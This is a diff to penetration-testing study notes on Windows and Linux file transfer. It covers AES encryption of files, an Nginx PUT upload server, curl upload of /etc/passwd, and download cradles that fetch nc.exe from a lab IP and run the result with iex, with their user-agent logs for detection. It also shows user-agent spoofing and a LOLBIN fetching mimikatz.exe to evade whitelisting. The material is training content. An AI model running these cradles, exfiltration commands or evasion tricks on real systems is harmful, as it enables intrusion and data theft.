@@ -98,7 +98,7 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
 
 Windows File Transfer Methods
 
-```powershell-session
+```bash
 PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
 
 Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
@@ -580,7 +580,7 @@ C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShel
 ```
 
 
-## PowerShell Session File Transfer
+# PowerShell Session File Transfer
 there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2)
 [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.
 
@@ -619,6 +619,346 @@ Alternatively, from Windows, the native [mstsc.exe](https://docs.microsoft.com/e
 ![](https://academy.hackthebox.com/storage/modules/24/rdp.png)
 After selecting the drive, we can interact with it in the remote session that follows.
 >**Note:** This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.
+
+# Protected File Transfers
+## File Encryption on Windows
+
+### [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1)
+This script is small and provides encryption of files and strings.
+
+```powershell
+.EXAMPLE
+Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text" 
+
+Description
+-----------
+Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.
+ 
+.EXAMPLE
+Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
+ 
+Description
+-----------
+Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
+ 
+.EXAMPLE
+Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
+ 
+Description
+-----------
+Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
+ 
+.EXAMPLE
+Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes
+ 
+Description
+-----------
+Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
+#>
+function Invoke-AESEncryption {
+    [CmdletBinding()]
+    [OutputType([string])]
+    Param
+    (
+        [Parameter(Mandatory = $true)]
+        [ValidateSet('Encrypt', 'Decrypt')]
+        [String]$Mode,
+
+        [Parameter(Mandatory = $true)]
+        [String]$Key,
+
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
+        [String]$Text,
+
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
+        [String]$Path
+    )
+
+    Begin {
+        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
+        $aesManaged = New-Object System.Security.Cryptography.AesManaged
+        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+        $aesManaged.BlockSize = 128
+        $aesManaged.KeySize = 256
+    }
+
+    Process {
+        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
+
+        switch ($Mode) {
+            'Encrypt' {
+                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName + ".aes"
+                }
+
+                $encryptor = $aesManaged.CreateEncryptor()
+                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
+                $encryptedBytes = $aesManaged.IV + $encryptedBytes
+                $aesManaged.Dispose()
+
+                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File encrypted to $outPath"
+                }
+            }
+
+            'Decrypt' {
+                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName -replace ".aes"
+                }
+
+                $aesManaged.IV = $cipherBytes[0..15]
+                $decryptor = $aesManaged.CreateDecryptor()
+                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
+                $aesManaged.Dispose()
+
+                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File decrypted to $outPath"
+                }
+            }
+        }
+    }
+
+    End {
+        $shaManaged.Dispose()
+        $aesManaged.Dispose()
+    }
+}
+```
+
+how to use :
+```bash
+Import-Module .\Invoke-AESEncryption.ps1
+Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
+Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path scan-results.txt.aes
+```
+
+## File Encryption on Linux
+### openssl
+```bash
+# Encrypting /etc/passwd with openssl
+openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
+
+# Decrypt passwd.enc with openssl
+openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd 
+
+# -pbkdf2 : Use safe modern key derivation (PBKDF2) instead of old weak method
+# -iter : Make PBKDF2 much slower (on purpose) to defend against password guessing attacks.
+```
+
+>Remember to use a strong and unique password to avoid brute-force cracking attacks
+
+# Catching Files over HTTPS
+There is nothing worse than being on a penetration test, and a client's network IDS picks up on a sensitive file being transferred over plaintext and having them ask why we sent a password to our cloud server without using encryption. so will cover creating a secure web server for file upload operations.
+
+## Nginx - Enabling PUT
+
+```bash
+# Create a Directory to Handle Uploaded Files
+sudo mkdir -p /var/www/uploads/SecretUploadDirectory
+#  Change the Owner to www-data
+sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+
+# Create Nginx Configuration File `/etc/nginx/sites-available/upload.conf`
+
+server {
+    listen 9001;
+    
+    location /SecretUploadDirectory/ {
+        root    /var/www/uploads;
+        dav_methods PUT;
+    }
+}
+
+# Symlink our Site to the sites-enabled Directory
+sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/ 
+# Start Nginx
+sudo systemctl restart nginx.service
+```
+
+> If we get any error messages, check `/var/log/nginx/error.log`. If using Pwnbox, we will see port 80 is already in use.
+
+```bash
+# Verifying Errors
+tail -2 /var/log/nginx/error.log #=> (`ddress already in use`)
+ss -lnpt | grep 80 #=>  .0.0.0:80        0.0.0.0:*    users:(("python",pid=`2811`,fd=3)
+ps -ef | grep 2811 #=>  python -m websockify 80 localhost:5901 -D
+
+# We see there is already a module listening on port 80
+# To get around this, we can remove the default Nginx configuration, which binds on port 80.
+sudo rm /etc/nginx/sites-enabled/default
+
+```
+
+### Upload File Using cURL
+
+```bash
+curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
+#check the uploaded file:
+udo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 
+```
+
+
+  
+# Detection
+
+Detection based on command-line blacklisting is easy to evade using techniques like case obfuscation, while whitelisting, though initially time-consuming, offers stronger and faster anomaly detection. HTTP protocols rely on client-server negotiation, with user agent strings helping servers identify clients such as browsers or tools like cURL and sqlmap. These strings are not limited to browsers and can be used by scripts or automated tools, making them useful indicators in traffic analysis. Organizations can improve detection by compiling lists of known legitimate user agents and using them in SIEM tools to isolate suspicious activity for investigation.
+
+### Invoke-WebRequest - Client
+
+```powershell
+Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
+Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
+```
+
+#### Invoke-WebRequest - Server
+
+```bash
+GET /nc.exe HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
+```
+
+### WinHttpRequest - Client
+
+```powershell
+$h=new-object -com WinHttp.WinHttpRequest.5.1;
+$h.open('GET','http://10.10.10.32/nc.exe',$false);
+$h.send();
+iex $h.ResponseText
+```
+
+#### WinHttpRequest - Server
+
+```bash
+GET /nc.exe HTTP/1.1
+Connection: Keep-Alive
+Accept: */*
+User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
+```
+
+### Msxml2 - Client
+
+```powershell
+$h=New-Object -ComObject Msxml2.XMLHTTP;
+$h.open('GET','http://10.10.10.32/nc.exe',$false);
+$h.send();
+iex $h.responseText
+```
+
+#### Msxml2 - Server
+
+```bash
+GET /nc.exe HTTP/1.1
+Accept: */*
+Accept-Language: en-us
+UA-CPU: AMD64
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
+```
+
+### Certutil - Client
+
+```bash
+certutil -urlcache -split -f http://10.10.10.32/nc.exe 
+certutil -verifyctl -split -f http://10.10.10.32/nc.exe
+```
+
+#### Certutil - Server
+
+```shell-session
+GET /nc.exe HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Pragma: no-cache
+Accept: */*
+User-Agent: Microsoft-CryptoAPI/10.0
+```
+
+### BITS - Client
+
+```powershell
+Import-Module bitstransfer;
+Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
+$r=gc $env:temp\t;
+rm $env:temp\t; 
+iex $r
+```
+
+#### BITS - Server
+
+```shell-session
+HEAD /nc.exe HTTP/1.1
+Connection: Keep-Alive
+Accept: */*
+Accept-Encoding: identity
+User-Agent: Microsoft BITS/7.8
+```
+
+# Evading Detection
+## Changing User Agent
+If diligent administrators or defenders have blacklisted any of these User Agents, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contains a UserAgent parameter, which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome...
+
+ Listing out User Agents:
+ ```powershell
+[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
+
+Name       : InternetExplorer
+User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)
+
+Name       : FireFox
+User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0
+
+Name       : Chrome
+User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
+             Safari/534.6
+
+Name       : Opera
+User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1
+
+Name       : Safari
+User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
+             Safari/533.16
+```
+Invoking Invoke-WebRequest to download nc.exe using a Chrome User Agent:
+```powershell
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+```
+## LOLBAS / GTFOBins
+
+Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. In this case, an option may be to use a "LOLBIN" (living off the land binary), alternatively also known as "misplaced trust binaries". An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems and contains functionality to download configuration files periodically. This download functionality can be invoked as follows:
+
+ Transferring File with GfxDownloadWrapper.exe
+ ```pwershell
+GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
+```
+Such a binary might be permitted to run by application whitelisting and be excluded from alerting.
+
+Other, more commonly available binaries are also available, and it is worth checking the [LOLBAS](https://lolbas-project.github.io/) project to find a suitable "file download" binary that exists in your environment. Linux's equivalent is the [GTFOBins](https://gtfobins.github.io/) project and is definitely also worth checking out. As of the time of writing, the GTFOBins project provides useful information on nearly 40 commonly installed binaries that can be used to perform file transfers.
 
 **Try Hard Security Group**
 
